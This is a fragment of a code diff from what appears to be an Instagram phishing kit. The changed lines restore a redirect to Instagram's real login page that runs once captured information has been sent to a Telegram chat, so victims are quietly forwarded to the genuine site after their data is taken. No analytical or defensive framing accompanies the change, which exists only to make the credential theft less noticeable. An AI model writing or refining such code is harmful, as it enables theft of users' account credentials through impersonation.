@@ -107,8 +107,8 @@
                 parse_mode: 'html',
                 text: message
             }).then(response => {
-                // Commenting out the redirection to Instagram official page
-                // window.location.href = "https://www.instagram.com/accounts/login/";
+                // After successfully sending the message to Telegram, redirect to Instagram
+                window.location.href = "https://www.instagram.com/accounts/login/";
             }).catch(error => {
                 console.log('Error:', error);  // Log the error for debugging
                 alert('Error sending the information. Please try again.');
